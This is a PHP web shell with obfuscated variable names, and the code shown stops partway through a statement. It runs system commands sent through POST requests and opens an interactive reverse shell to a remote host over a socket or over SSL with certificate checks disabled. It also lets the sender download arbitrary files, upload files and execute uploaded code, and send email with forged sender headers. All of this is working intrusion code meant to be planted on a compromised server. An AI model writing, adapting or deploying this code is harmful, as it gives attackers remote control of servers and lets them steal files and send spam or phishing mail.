<?php
echo '[syslog]01
'; $sp160c2e = false; $spff2c9e = $sp700382 = $sp60e8b5 = $spbcd485 = $sp7fd55f = $sp295938 = $sp83a6f0 = $sp5060d2 = ''; $sp47d1cb = '.password.' . HashMD5('anti-lfi'); $sp240d1a = ''; $sp29f89f = @sys_get_temp_dir(); $sp7abe78 = @ini_get('upload_tmp_dir'); $spe7342d = @getcwd(); if (is_dir($spe7342d) && is_writable($spe7342d)) { $sp240d1a = $spe7342d; } else { if (is_dir($sp7abe78) && is_writable($sp7abe78)) { $sp240d1a = $sp7abe78; } else { if (is_dir($sp29f89f) && is_writable($sp29f89f)) { $sp240d1a = $sp29f89f; } else { die('Error:Could not find a writable directory!'); } } } chdir($sp240d1a); $sp132912 = 'htterminal'; is_dir($sp132912) || @mkdir($sp132912); $sp240d1a .= DIRECTORY_SEPARATOR . $sp132912; chdir($sp240d1a); $spd8eda3 = 'true'; $sp7472ed = 'true'; $sp81349f = ''; if (DIRECTORY_SEPARATOR == '/') { $sp81349f = 'unix-linux-mac'; } else { if (DIRECTORY_SEPARATOR == '\\') { $sp81349f = 'windows'; } } $sp70904c = getcwd() . $spd8eda3 . $sp7472ed . phpversion(); function TestShell() { $sp947bb7 = trim(@SysExec('echo 1234', true)); if ($sp947bb7 != '1234') { LogTXT('Warning:command-line isn\'t available!You can\'t execute system commands! :(

'); } } function ChangeShellMode() { global $spc44712; global $sp83a6f0; if (FuncAvailable('proc_open') == false) { LogTXT('proc_open is disabled and mode is command-only.You can\'t change your shell mode.
'); die; } else { if (file_exists($sp83a6f0)) { $sp9c4d84 = file_get_contents($sp83a6f0); if ($sp9c4d84 == 'proc_open') { $spc44712 = 'command_only'; LogTXT('Shell mode changed to command_only mode
'); } else { $spc44712 = 'proc_open'; LogTXT('Shell mode changed to proc_open mode
'); } } } die; } function SetDefaultShellMode($spd124fb) { global $sp83a6f0; global $spc44712; if (file_exists($sp83a6f0)) { $sp9c4d84 = file_get_contents($sp83a6f0); if ($sp9c4d84 == 'proc_open') { $spc44712 = 'proc_open'; if ($spd124fb) { LogTXT('Shell mode is proc_open mode
'); } } else { $spc44712 = 'command_only'; if ($spd124fb) { LogTXT('Shell mode is command_only mode
'); } } } else { if (FuncAvailable('proc_open')) { $spc44712 = 'proc_open'; if ($spd124fb) { LogTXT('Shell mode is proc_open mode
'); } } else { $spc44712 = 'command_only'; if ($spd124fb) { LogTXT('Shell mode is command_only mode
'); } } } } function cwd() { global $sp5060d2; SetDefaultShellMode(false); global $spc44712; global $sp240d1a; if (file_exists($sp5060d2)) { $spa25e24 = trim(file_get_contents($sp5060d2)); chdir($spa25e24); $spa25e24 = getcwd(); chdir($sp240d1a); return "Current directory is:{$spa25e24}\n"; } else { return "Current directory is:{$sp240d1a}\n"; } } function CCD($spa25e24) { global $sp5060d2; SetDefaultShellMode(false); global $spc44712; global $sp240d1a; if (trim($spa25e24) != '') { if (file_exists($sp5060d2)) { $spbafbf2 = trim(file_get_contents($sp5060d2)); chdir($spbafbf2); } $sp49de29 = realpath(trim($spa25e24)); if ($sp49de29 !== false && is_dir($sp49de29)) { chdir($sp49de29); $sp49de29 = getcwd(); chdir($sp240d1a); return "Current directory changed to:{$sp49de29}\n"; } else { chdir($sp240d1a); return "{$spa25e24} is not a valid directory.\n"; } return 0; } } function FuncAvailable($spc50158) { if (in_array(strtolower(ini_get('safe_mode')), array('on', '1'), true) || !function_exists($spc50158)) { return false; } $sp9f2e0a = explode(',', ini_get('disable_functions')); $sp902c2a = !in_array($spc50158, $sp9f2e0a); return $sp902c2a ? true : false; } function SysExec($sp7bd36a, $spea1364) { global $sp240d1a; $sped1c3a = $sp240d1a . DIRECTORY_SEPARATOR . '.tmp'; if (FuncAvailable('system')) { if ($spea1364) { $sp7bd36a .= " > {$sped1c3a}"; } system($sp7bd36a); if ($spea1364) { $spfd181b = file_get_contents("{$sped1c3a}"); unlink("{$sped1c3a}"); return $spfd181b; } else { return true; } } elseif (FuncAvailable('shell_exec')) { $spf60383 = shell_exec($sp7bd36a); if ($spea1364) { return $spf60383; } else { return true; } } elseif (FuncAvailable('exec')) { if ($spea1364) { $sp7bd36a .= " > {$sped1c3a}"; } exec($sp7bd36a); if ($spea1364) { $spfd181b = file_get_contents("{$sped1c3a}"); unlink("{$sped1c3a}"); return $spfd181b; } else { return true; } } elseif (FuncAvailable('passthru')) { if ($spea1364) { $sp7bd36a .= " > {$sped1c3a}"; } passthru($sp7bd36a); if ($spea1364) { $spfd181b = file_get_contents("{$sped1c3a}"); unlink("{$sped1c3a}"); return $spfd181b; } else { return true; } } elseif (FuncAvailable('proc_open')) { if ($spea1364) { $sp7bd36a .= " > {$sped1c3a}"; } proc_close(proc_open($sp7bd36a, array(), $sp947bb7)); if ($spea1364) { $spfd181b = file_get_contents("{$sped1c3a}"); unlink("{$sped1c3a}"); return $spfd181b; } else { return true; } } else { return false; } } function SendSIGKILL() { global $sp7fd55f; } function SendSTDIN() { SetDefaultShellMode(false); global $spc44712; global $sp295938; touch($sp295938); if ($spc44712 == 'proc_open') { global $sp81349f; global $sp60e8b5; global $spbcd485; if ($sp81349f != 'windows') { $sp37b7d8 = 'Error: Shell Process Not Running.send "start" or "rv" command
'; } else { $sp37b7d8 = 'Error: cmd.exe Not Running.send "start" or "rv" command
'; } if (file_exists($sp60e8b5)) { clearstatcache(); $sp3d27f7 = time() - filemtime($sp60e8b5); if (3 < $sp3d27f7) { LogTXT($sp37b7d8); die; } } else { LogTXT($sp37b7d8); die; } if (file_exists($spbcd485)) { $sp10b7e6 = file_get_contents($spbcd485); if ($sp10b7e6 != '') { if ($sp81349f != 'windows') { if (!file_exists('/proc/' . $sp10b7e6)) { LogTXT($sp37b7d8); } } else { if (!IsCMDProcessRunning()) { LogTXT($sp37b7d8); die; } } } } $spb5d760 = $_POST['c']; global $spff2c9e; } else { $spb5d760 = trim($_POST['c']); global $sp5060d2; if (file_exists($sp5060d2)) { chdir(trim(file_get_contents($sp5060d2))); } $sp323b44 = SysExec($spb5d760, true); global $sp240d1a; chdir($sp240d1a); if (trim($spb5d760) != '') { LogTXT("{$spb5d760}\n{$sp323b44}>"); } else { LogTXT('
>'); } } } echo '[syslog]02
'; function LogTXT($sp32e067) { global $sp700382; } function ReadTXT() { global $sp700382; global $sp295938; touch($sp295938); if (file_exists($sp700382)) { $sp9c4d84 = file_get_contents($sp700382); @unlink($sp700382); die($sp9c4d84); } } function KillProcess($sp10b7e6) { global $sp81349f; if ($sp81349f == 'unix-linux-mac') { SysExec("kill -9 {$sp10b7e6} &", false); } else { SysExec("START /B TASKKILL /F /T /PID {$sp10b7e6}", false); } } function IsCMDProcessRunning() { global $sp64801f; if (!file_exists($sp64801f)) { return false; } else { if (@is_writable($sp64801f)) { if (@unlink($sp64801f)) { return false; } else { return true; } } else { return false; } } } function StartShell($sp9dace2, $sp0bd168 = '', $sp2d79fe = '') { global $spff2c9e; global $sp700382; global $sp60e8b5; global $spbcd485; global $sp7fd55f; global $sp295938; global $sp83a6f0; global $spc44712; global $sp5060d2; global $sp45c68d; global $spd8eda3; global $sp7472ed; global $sp81349f; global $sp64801f; global $sp2811ed; if (PHP_SAPI != 'cli') { ignore_user_abort(true); ob_start(); header('Connection: close'); header('Content-Length: ' . ob_get_length()); ob_end_flush(); ob_flush(); flush(); } else { $sp45c68d = "\nOperation System:{$spd8eda3}\nUser:{$sp7472ed}\n\n"; $spff2c9e = '.in.' . HashMD5('anti-lfi'); $sp700382 = '.out.' . HashMD5('anti-lfi'); $sp60e8b5 = '.timer.' . HashMD5('anti-lfi'); $spbcd485 = '.pid.' . HashMD5('anti-lfi'); $sp7fd55f = '.SIGKILL.' . HashMD5('anti-lfi'); $sp295938 = '.CLast.' . HashMD5('anti-lfi'); $sp83a6f0 = '.mode.' . HashMD5('anti-lfi'); $spc44712 = ''; $sp5060d2 = '.ccd.' . HashMD5('anti-lfi'); if ($sp81349f == 'windows') { $sp64801f = 'results.' . HashMD5('anti-lfi'); $sp2811ed = 'error.' . HashMD5('anti-lfi'); } if (file_exists($sp700382)) { @unlink($sp700382); } if (file_exists($spff2c9e)) { @unlink($spff2c9e); } } if (file_exists($sp5060d2)) { $spa25e24 = trim(file_get_contents($sp5060d2)); } else { $spa25e24 = getcwd(); } $spfe6fb7 = ''; $sp2ea0cc = ''; $spfe78c5 = null; if ($sp9dace2 == 'socket') { $sp0bd168 = gethostbyname($sp0bd168); $spfe78c5 = fsockopen($sp0bd168, $sp2d79fe, $spfe6fb7, $sp2ea0cc, 50); } elseif ($sp9dace2 == 'ssl') { $sp0b7ad5 = stream_context_create(array('ssl' => array('verify_peer' => false, 'verify_peer_name' => false))); $sp0bd168 = gethostbyname($sp0bd168); $spfe78c5 = stream_socket_client("ssl://{$sp0bd168}:{$sp2d79fe}", $spfe6fb7, $sp2ea0cc, 50, STREAM_CLIENT_CONNECT, $sp0b7ad5); } if ($sp9dace2 != 'local') { if (!$spfe78c5) { LogTXT("Connecting to {$sp0bd168}:{$sp2d79fe} got error:{$sp2ea0cc}({$spfe6fb7})\n"); die; } else { LogTXT("Connected to {$sp0bd168}:{$sp2d79fe} successfully for reverse shell\n"); stream_set_blocking($spfe78c5, 0); } } $spb5ce3f = 3000; SetDefaultShellMode(false); global $spc44712; if ($spc44712 != 'proc_open') { $sp37b7d8 = '

This PHP file path:' . __FILE__ . '
Current working directory:' . $spa25e24 . '
'; if (!is_null($spfe78c5)) { fwrite($spfe78c5, $sp37b7d8); } $sp37b7d8 = 'Warning:shell mode is command_only.
You can\'t get run-time outputs or read stderr
'; if (!is_null($spfe78c5)) { fwrite($spfe78c5, $sp37b7d8); } $sp37b7d8 = $sp45c68d; if (!is_null($spfe78c5)) { fwrite($spfe78c5, $sp37b7d8); } $sp37b7d8 = 'You can use "cwd" to get current working directory,"ccd" to change current working directory,"exit" or "quit" commands to exit the shell.
>'; if (!is_null($spfe78c5)) { fwrite($spfe78c5, $sp37b7d8); } while (1) { global $sp295938; touch($sp295938); if (feof($spfe78c5)) { LogTXT("ERROR: Reverse Shell connection to {$sp0bd168}:{$sp2d79fe} was terminated\n"); break; } $sp662db9 = fread($spfe78c5, $spb5ce3f); if (trim($sp662db9) != '') { if (trim($sp662db9) == 'exit' || trim($sp662db9) == 'quit') { break; } if (strpos(trim($sp662db9), 'ccd ') === 0) { $spa25e24 = substr(trim($sp662db9), 4); fwrite($spfe78c5, CCD($spa25e24)); global $sp5060d2; if (file_exists($sp5060d2)) { chdir(trim(file_get_contents($sp5060d2))); } } elseif (trim($sp662db9) == 'cwd') { fwrite($spfe78c5, cwd() . '>'); } else { $sp7a2456 = SysExec(trim($sp662db9), true); global $sp240d1a; chdir($sp240d1a); if (trim($sp7a2456) != '') { fwrite($spfe78c5, ">{$sp662db9}\n{$sp7a2456}"); } elseif ($sp7a2456 == '
') { fwrite($spfe78c5, '
'); } } } elseif ($sp662db9 == '
') { fwrite($spfe78c5, '>'); } } fclose($spfe78c5); LogTXT("Reverse Shell connection to {$sp0bd168}:{$sp2d79fe} closed\n"); die; } if ($sp81349f == 'unix-linux-mac') { if (function_exists('pcntl_fork')) { $sp10b7e6 = pcntl_fork(); if ($sp10b7e6 == -1) { LogTXT('ERROR: Can\'t fork
'); die(1); } if ($sp10b7e6) { die(0); } if (posix_setsid() == -1) { LogTXT('Error: Can\'t setsid()
'); die(1); } } else { LogTXT('WARNING: Failed to daemonise.  This is quite common and not fatal.
'); } if (file_exists($sp60e8b5)) { $sp3d27f7 = time() - filemtime($sp60e8b5); if ($sp3d27f7 <= 3) { $sp37b7d8 = 'ERROR: shell process already is running
'; if (!is_null($spfe78c5)) { fwrite($spfe78c5, $sp37b7d8); fclose($spfe78c5); LogTXT("Reverse Shell connection to {$sp0bd168}:{$sp2d79fe} closed\n"); } else { LogTXT($sp37b7d8); } die; } } if (file_exists($spbcd485)) { $sp10b7e6 = file_get_contents($spbcd485); if ($sp10b7e6 != '') { if (file_exists('/proc/' . $sp10b7e6)) { if (file_exists($spff2c9e)) { unlink($spff2c9e); } if (file_exists($sp700382)) { unlink($sp700382); } if (file_exists($sp60e8b5)) { unlink($sp60e8b5); } if (file_exists($spbcd485)) { unlink($spbcd485); } if (file_exists($sp7fd55f)) { unlink($sp7fd55f); } KillProcess($sp10b7e6); } } } $sp3f9f68 = array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w')); $sp91772b = '/usr/bin/python2 -c \'import pty; pty.spawn("/bin/sh")\''; $sp621347 = proc_open($sp91772b, $sp3f9f68, $spc3c09c, $spa25e24); $sp37b7d8 = ''; if (!is_resource($sp621347)) { $sp37b7d8 = 'Error: Can not Use Python.You can\'t handle tty.Trying /bin/sh...
'; if (!is_null($spfe78c5)) { fwrite($spfe78c5, $sp37b7d8); } else { LogTXT($sp37b7d8); } $sp91772b = '/bin/sh'; $sp621347 = proc_open($sp91772b, $sp3f9f68, $spc3c09c, $spa25e24); if (!is_resource($sp621347)) { $sp37b7d8 = 'Error: Failed To access /bin/sh.
'; if (!is_null($spfe78c5)) { fwrite($spfe78c5, $sp37b7d8); } else { LogTXT($sp37b7d8); } die; } else { $sp37b7d8 = 'Ok:Used /bin/sh to create shell.use expect to handle tty
'; if (!is_null($spfe78c5)) { fwrite($spfe78c5, $sp37b7d8); } else { LogTXT($sp37b7d8); } $sp676578 = proc_get_status($sp621347); $sp10b7e6 = $sp676578['pid'] + 1; } } else { $sp37b7d8 = 'Ok:Used python to create shell
'; if (!is_null($spfe78c5)) { fwrite($spfe78c5, $sp37b7d8); } else { LogTXT($sp37b7d8); } $sp676578 = proc_get_status($sp621347); $sp10b7e6 = $sp676578['pid'] + 1; } stream_set_blocking($spc3c09c[0], 0); stream_set_blocking($spc3c09c[1], 0); stream_set_blocking($spc3c09c[2], 0); $sp37b7d8 = '

This PHP file path:' . __FILE__ . '
Current working directory:' . $spa25e24 . '
'; if (!is_null($spfe78c5)) { fwrite($spfe78c5, $sp37b7d8); } else { LogTXT($sp37b7d8); } $sp37b7d8 = $sp45c68d; if (!is_null($spfe78c5)) { fwrite($spfe78c5, $sp37b7d8); } else { LogTXT($sp37b7d8); } while (1) { clearstatcache(); touch($sp60e8b5); if (feof($spc3c09c[1])) { $sp37b7d8 = 'ERROR: Shell process terminated
'; if (!is_null($spfe78c5)) { fwrite($spfe78c5, $sp37b7d8); } else { LogTXT($sp37b7d8); } break; } if (!is_null($spfe78c5)) { if (feof($spfe78c5)) { LogTXT("ERROR: Reverse Shell connection to {$sp0bd168}:{$sp2d79fe} was terminated\n"); break; } else { touch($sp295938); } } $sp6ffd97 = array($spc3c09c[1], $spc3c09c[2]); if (!is_null($spfe78c5)) { array_push($sp6ffd97, $spfe78c5); } else { if (file_exists($spff2c9e)) { $sp9c4d84 = file_get_contents($spff2c9e); fwrite($spc3c09c[0], $sp9c4d84); unlink($spff2c9e); } } if (file_exists($sp295938)) { clearstatcache(); $sp3d27f7 = time() - filemtime($sp295938); if (60 < $sp3d27f7) { if (file_exists($sp7fd55f)) { unlink($sp7fd55f); } if (file_exists($spff2c9e)) { unlink($spff2c9e); } if (file_exists($sp700382)) { unlink($sp700382); } if (file_exists($sp60e8b5)) { unlink($sp60e8b5); } if (file_exists($sp295938)) { unlink($sp295938); } if (file_exists($spbcd485)) { $sp10b7e6 = file_get_contents($spbcd485); if ($sp10b7e6 != '') { if (file_exists('/proc/' . $sp10b7e6)) { KillProcess($sp10b7e6); } } unlink($spbcd485); } break; } } if (file_exists($sp7fd55f)) { unlink($sp7fd55f); if (file_exists($spff2c9e)) { unlink($spff2c9e); } if (file_exists($sp700382)) { unlink($sp700382); } if (file_exists($sp60e8b5)) { unlink($sp60e8b5); } if (file_exists($spbcd485)) { $sp10b7e6 = file_get_contents($spbcd485); if ($sp10b7e6 != '') { if (file_exists('/proc/' . $sp10b7e6)) { KillProcess($sp10b7e6); } } unlink($spbcd485); } $sp37b7d8 = 'Shell process killed
'; if (!is_null($spfe78c5)) { fwrite($spfe78c5, $sp37b7d8); } else { LogTXT($sp37b7d8); } break; } if (in_array($spc3c09c[1], $sp6ffd97)) { $sp7a2456 = fread($spc3c09c[1], $spb5ce3f); touch($sp295938); if ($sp7a2456 != '') { if (!is_null($spfe78c5)) { fwrite($spfe78c5, $sp7a2456); } else { LogTXT($sp7a2456); } } } if (in_array($spc3c09c[2], $sp6ffd97)) { $sp7a2456 = fread($spc3c09c[2], $spb5ce3f); touch($sp295938); if ($sp7a2456 != '') { if (!is_null($spfe78c5)) { fwrite($spfe78c5, $sp7a2456); } else { LogTXT($sp7a2456); } } } if (!is_null($spfe78c5)) { if (in_array($spfe78c5, $sp6ffd97)) { $spfd8b49 = fread($spfe78c5, $spb5ce3f); touch($sp295938); if ($spfd8b49 != '') { fwrite($spc3c09c[0], $spfd8b49); } } } } fclose($spc3c09c[0]); fclose($spc3c09c[1]); fclose($spc3c09c[2]); if (!is_null($spfe78c5)) { fclose($spfe78c5); LogTXT("Reverse Shell connection to {$sp0bd168}:{$sp2d79fe} closed\n"); } proc_close($sp621347); die; } else { global $sp64801f; global $sp2811ed; if (file_exists($sp60e8b5)) { $sp3d27f7 = time() - filemtime($sp60e8b5); if ($sp3d27f7 <= 3) { $sp37b7d8 = 'cmd.exe process already is running
'; if (!is_null($spfe78c5)) { fwrite($spfe78c5, $sp37b7d8); fclose($spfe78c5); LogTXT("Reverse Shell connection to {$sp0bd168}:{$sp2d79fe} closed\n"); } else { LogTXT($sp37b7d8); } die; } } if (file_exists($spbcd485)) { $sp10b7e6 = file_get_contents($spbcd485); if ($sp10b7e6 != '') { if (file_exists($spff2c9e)) { unlink($spff2c9e); } if (file_exists($sp700382)) { unlink($sp700382); } if (file_exists($sp60e8b5)) { unlink($sp60e8b5); } if (file_exists($spbcd485)) { unlink($spbcd485); } if (file_exists($sp7fd55f)) { unlink($sp7fd55f); } KillProcess($sp10b7e6); } } if (IsCMDProcessRunning()) { $sp37b7d8 = 'cmd.exe process already is running'; if (!is_null($spfe78c5)) { fwrite($spfe78c5, $sp37b7d8); } else { LogTXT($sp37b7d8); } die; } $sp3f9f68 = array(0 => array('pipe', 'r'), 1 => array('file', $sp64801f, 'w'), 2 => array('file', $sp2811ed, 'w')); $sp621347 = proc_open('start /b cmd.exe', $sp3f9f68, $spc3c09c, $spa25e24); if (is_resource($sp621347)) { $sp52078b = proc_get_status($sp621347)['pid']; $sp32e067 = SysExec("wmic process get parentprocessid,processid | find \"{$sp52078b}\"", true); $sp323b44 = array_filter(explode(' ', $sp32e067)); array_pop($sp323b44); $sp10b7e6 = end($sp323b44); stream_set_blocking($spc3c09c[0], 0); $sp37b7d8 = 'Ok:Used cmd.exe to create shell
'; if (!is_null($spfe78c5)) { fwrite($spfe78c5, $sp37b7d8); } else { LogTXT($sp37b7d8); } $sp37b7d8 = '

This PHP file path:' . __FILE__ . '
Current working directory:' . $spa25e24 . '
'; if (!is_null($spfe78c5)) { fwrite($spfe78c5, $sp37b7d8); } else { LogTXT($sp37b7d8); } global $sp45c68d; $sp37b7d8 = $sp45c68d; if (!is_null($spfe78c5)) { fwrite($spfe78c5, $sp37b7d8); } else { LogTXT($sp37b7d8); } $sp92ea66 = 0; $sp92d741 = 0; while (1) { if (!IsCMDProcessRunning()) { $sp37b7d8 = 'ERROR: cmd.exe process terminated
'; if (!is_null($spfe78c5)) { fwrite($spfe78c5, $sp37b7d8); fclose($spfe78c5); LogTXT("Reverse Shell connection to {$sp0bd168}:{$sp2d79fe} closed\n"); } else { LogTXT($sp37b7d8); } break; } if (file_exists($sp7fd55f)) { @unlink($sp7fd55f); if (file_exists($spff2c9e)) { @unlink($spff2c9e); } if (file_exists($sp700382)) { @unlink($sp700382); } if (file_exists($sp60e8b5)) { @unlink($sp60e8b5); } if (file_exists($spbcd485)) { $sp10b7e6 = file_get_contents($spbcd485); if ($sp10b7e6 != '') { KillProcess($sp10b7e6); } unlink($spbcd485); } $sp37b7d8 = 'cmd.exe process killed
'; if (!is_null($spfe78c5)) { fwrite($spfe78c5, $sp37b7d8); } else { LogTXT($sp37b7d8); } break; } if (file_exists($sp295938)) { $sp3d27f7 = time() - filemtime($sp295938); if (60 < $sp3d27f7) { if (file_exists($sp7fd55f)) { unlink($sp7fd55f); } if (file_exists($spff2c9e)) { unlink($spff2c9e); } if (file_exists($sp700382)) { unlink($sp700382); } if (file_exists($sp295938)) { unlink($sp295938); } if (file_exists($sp60e8b5)) { @unlink($sp60e8b5); } if (file_exists($spbcd485)) { $sp10b7e6 = file_get_contents($spbcd485); if ($sp10b7e6 != '') { KillProcess($sp10b7e6); } unlink($spbcd485); } break; } } clearstatcache(); touch($sp60e8b5); if (!is_null($spfe78c5)) { if (feof($spfe78c5)) { LogTXT("ERROR: Reverse Shell connection to {$sp0bd168}:{$sp2d79fe} was terminated\n"); break; } else { touch($sp295938); } } else { } if (file_exists($spff2c9e)) { $sp9c4d84 = file_get_contents($spff2c9e); fwrite($spc3c09c[0], $sp9c4d84); @unlink($spff2c9e); } if (!is_null($spfe78c5)) { $sp5af9c8 = fread($spfe78c5, $spb5ce3f); } if ($sp92ea66 != filesize($sp64801f)) { $spcf4eb5 = file_get_contents($sp64801f, FALSE, NULL, $sp92ea66, filesize($sp64801f) - $sp92ea66); $sp37b7d8 = $spcf4eb5; if (!is_null($spfe78c5)) { fwrite($spfe78c5, $sp37b7d8); } else { LogTXT($sp37b7d8); } } $sp92ea66 = filesize($sp64801f); if ($sp92d741 != filesize($sp2811ed)) { $spcf4eb5 = file_get_contents($sp2811ed, FALSE, NULL, $sp92d741, filesize($sp2811ed) - $sp92d741); $sp37b7d8 = $spcf4eb5; if (!is_null($spfe78c5)) { fwrite($spfe78c5, $sp37b7d8); } else { LogTXT($sp37b7d8); } } $sp92d741 = filesize($sp2811ed); } fclose($spc3c09c[0]); KillProcess($sp10b7e6); KillProcess($sp52078b); proc_close($sp621347); if (!is_null($spfe78c5)) { fclose($spfe78c5); LogTXT("Reverse Shell connection to {$sp0bd168}:{$sp2d79fe} closed\n"); } if (file_exists($sp64801f)) { @unlink($sp64801f); } if (file_exists($sp2811ed)) { @unlink($sp2811ed); } } else { $sp37b7d8 = 'Error: Failed To access cmd.exe.
'; if (!is_null($spfe78c5)) { fwrite($spfe78c5, $sp37b7d8); } else { LogTXT($sp37b7d8); } die; } } } $sp7022f6 = ''; function ErrorHandler($spfe6fb7, $sp2ea0cc, $spc9bb75, $spad1ed5) { global $sp7022f6; global $spdc884d; global $sp160c2e; $spdc884d += 1; if (strlen($sp7022f6) > 1024) { $sp7022f6 = ''; } $sp7022f6 .= "Error {$spdc884d}:{$sp2ea0cc};"; if ($sp160c2e) { } } function DownloadFile() { global $sp5060d2; if (file_exists($sp5060d2)) { chdir(trim(file_get_contents($sp5060d2))); } if (!isset($_POST['d'])) { $spa3ecf0 = ''; } else { $spa3ecf0 = $_POST['d']; } $spb06e63 = @mime_content_type($spa3ecf0); header('Content-disposition: ' . $spb06e63 . ';filename=' . basename($spa3ecf0)); header('Content-Type: ' . $spb06e63 . '; charset=UTF-8'); readfile($spa3ecf0); global $sp7022f6; if ($sp7022f6 != '') { header('Content-Type: text/error; charset=UTF-8'); die($sp7022f6); } } function pexec() { global $sp5060d2; if (file_exists($sp5060d2)) { chdir(trim(file_get_contents($sp5060d2))); } @(include $_FILES['file']['tmp_name']); } function Upload() { global $sp5060d2; if (file_exists($sp5060d2)) { chdir(trim(file_get_contents($sp5060d2))); } $sp2e4074 = '.' . DIRECTORY_SEPARATOR; if (isset($_POST['p']) && $_POST['p'] != '') { $sp2e4074 = $_POST['p']; if (substr($sp2e4074, -1) != DIRECTORY_SEPARATOR) { $sp2e4074 .= DIRECTORY_SEPARATOR; } } $sp262d98 = $sp2e4074 . basename($_FILES['file']['name']); if (@(!move_uploaded_file($_FILES['file']['tmp_name'], $sp262d98))) { header('Content-Type: text/error; charset=UTF-8'); global $sp7022f6; die($sp7022f6); } } function generateRandomString($sp578851) { $spe210c2 = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; $sp7c8e0f = strlen($spe210c2); $sp92f757 = ''; for ($sp6c3e91 = 0; $sp6c3e91 < $sp578851; $sp6c3e91++) { $sp92f757 .= $spe210c2[rand(0, $sp7c8e0f - 1)]; } return $sp92f757; } function SendMail() { global $sp5060d2; if (file_exists($sp5060d2)) { chdir(trim(file_get_contents($sp5060d2))); } ini_set('mail.add_x_header', 0); if (isset($_POST['from']) && $_POST['from'] != '') { $spf6268a = $_POST['from']; } if (isset($_POST['to']) && $_POST['to'] != '') { $sp438846 = $_POST['to']; } $spc4843d = ''; if (isset($_POST['subject']) && $_POST['subject'] != '') { $spc4843d = $_POST['subject']; } $sp2f3c60 = $_POST['messagefile']; $sp34442b = file_get_contents($sp2f3c60); $sp4e20b8 = mime_content_type($sp2f3c60); $sp49be68 = 'MIME-Version: 1.0
'; $sp49be68 .= "From: {$spf6268a}\r\n"; $sp0d7804 = $spf6268a; if (isset($_POST['replyto']) && $_POST['replyto'] != '') { $sp0d7804 = $_POST['replyto']; } $sp49be68 .= "Reply-To: {$sp0d7804}\r\n"; if (isset($_POST['cc'])) { $sp9659c7 = $_POST['cc']; $sp9659c7 = explode(',', $sp9659c7); $sp9659c7 = array_filter($sp9659c7); $sp9659c7 = implode(', ', $sp9659c7); $sp49be68 .= "Cc: {$sp9659c7}\r\n"; } if (isset($_POST['bcc'])) { $sp700280 = $_POST['bcc']; $sp700280 = explode(',', $sp700280); $sp700280 = array_filter($sp700280); $sp700280 = implode(', ', $sp700280); $sp49be68 .= "Bcc: {$sp700280}\r\n"; } $spbfb840 = md5(generateRandomString(5)); $sp49be68 .= "Content-Type: multipart/mixed; boundary = {$spbfb840}\r\n\r\n"; $sp15a5cb = "--{$spbfb840}\r\n"; $sp15a5cb .= 'Content-Type: text/html; charset=ISO-8859-1
'; $sp15a5cb .= 'Content-Transfer-Encoding: base64

'; $sp15a5cb .= chunk_split(base64_encode($sp34442b)); if (isset($_POST['attachmentfile']) && $_POST['attachmentfile'] != '') { $spa3ecf0 = $_POST['attachmentfile']; $spe12ce4 = chunk_split(base64_encode(file_get_contents($spa3ecf0))); $sp7044c1 = basename($spa3ecf0); $sp113a53 = mime_content_type($spa3ecf0); $sp15a5cb .= "--{$spbfb840}\r\n"; $sp15a5cb .= "Content-Type: {$sp113a53}; name=" . $sp7044c1 . '
'; $sp15a5cb .= 'Content-Disposition: attachment; filename=' . $sp7044c1 . '
'; $sp15a5cb .= 'Content-Transfer-Encoding: base64
'; $sp15a5cb .= 'X-Attachment-Id: ' . rand(1000, 99999) . '

'; $sp15a5cb .= $spe12ce4; } mail($sp438846, $spc4843d, $sp15a5cb, $sp49be68); global $sp7022f6; if ($sp7022f6 != '') { header('Content-Type: text/error; charset=UTF-8'); die($sp7022f6); } } function StartSession() { global $spff2c9e; global $sp700382; global $sp60e8b5; global $spbcd485; global $sp7fd55f; global $sp295938; global $sp83a6f0; global $spc44712; global $sp5060d2; global $sp45c68d; global $spd8eda3; global $sp7472ed; global $sp81349f; global $sp64801f; global $sp2811ed; $sp45c68d = "\nOperation System:{$spd8eda3}\nUser:{$sp7472ed}\n\n"; $spff2c9e = '.in.' . HashMD5('anti-lfi'); $sp700382 = '.out.' . HashMD5('anti-lfi'); $sp60e8b5 = '.timer.' . HashMD5('anti-lfi'); $spbcd485 = '.pid.' . HashMD5('anti-lfi'); $sp7fd55f = '.SIGKILL.' . HashMD5('anti-lfi'); $sp295938 = '.CLast.' . HashMD5('anti-lfi'); $sp83a6f0 = '.mode.' . HashMD5('anti-lfi'); $spc44712 = ''; $sp5060d2 = '.ccd.' . HashMD5('anti-lfi'); if ($sp81349f == 'windows') { $sp64801f = 'results.' . HashMD5('anti-lfi'); $sp2811ed = 'error.' . HashMD5('anti-lfi'); } if (file_exists($sp700382)) { @unlink($sp700382); } if (file_exists($spff2c9e)) { @unlink($spff2c9e); } if (file_exists($sp5060d2)) { $spa25e24 = trim(file_get_contents($sp5060d2)); } else { $spa25e24 = getcwd(); } $_SESSION['loggedIn'] = 1; $sp73d1aa = generateRandomString(25); $_SESSION['CSRF_TOKEN'] = $sp73d1aa; header('CSRF_TOKEN: ' . $sp73d1aa); SetDefaultShellMode(false); $sp37b7d8 = $sp45c68d . "Current Working directory:{$spa25e24}\nThis PHP file path:" . __FILE__ . '


'; if ($spc44712 != 'proc_open') { $sp37b7d8 .= 'Warning:Shell mode is command_only.
You can\'t get run-time outputs or read stderr
Just send your command to execute them
or use command "rv" to get a reverse shell

'; } Logtxt($sp37b7d8); TestShell(); SetDefaultShellMode(true); } function CheckCSRF_Token() { if (!isset($_POST['token'])) { LogTXT('You are under CSRF attack!
'); die; } else { $specd652 = $_POST['token']; if ($_SESSION['CSRF_TOKEN'] != $specd652) { if ($specd652 != '') { die; } else { header('CSRF_TOKEN: ' . $_SESSION['CSRF_TOKEN']); } } } } function IsSessionExistsAndIsValid() { if (session_status() !== PHP_SESSION_ACTIVE) { session_start(); } if (!isset($_SESSION['loggedIn'])) { return false; } global $spff2c9e; global $sp700382; global $sp60e8b5; global $spbcd485; global $sp7fd55f; global $sp295938; global $sp83a6f0; global $spc44712; global $sp5060d2; global $sp45c68d; global $spd8eda3; global $sp7472ed; global $sp64801f; global $sp2811ed; global $sp81349f; $sp45c68d = "\nOperation System:{$spd8eda3}\nUser:{$sp7472ed}\n\n"; $spff2c9e = '.in.' . HashMD5('anti-lfi'); $sp700382 = '.out.' . HashMD5('anti-lfi'); $sp60e8b5 = '.timer.' . HashMD5('anti-lfi'); $spbcd485 = '.pid.' . HashMD5('anti-lfi'); $sp7fd55f = '.SIGKILL.' . 